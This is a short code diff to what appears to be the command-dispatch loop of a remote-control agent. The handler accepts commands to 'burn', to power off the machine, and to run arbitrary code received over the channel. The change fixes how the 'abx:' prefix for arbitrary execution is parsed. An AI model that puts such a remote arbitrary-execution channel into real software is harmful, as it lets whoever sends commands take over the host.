@@ -97,8 +97,8 @@ def communicate():
                     burn()
                 case "shutdown":
                     os.system("poweroff")
-                case "abx":
-                    arbitrary_exec(load[3:])
+                case "abx:":
+                    arbitrary_exec(load[4:])
                 case _:
                     logging.error("Bad command: {}".format(load))
 
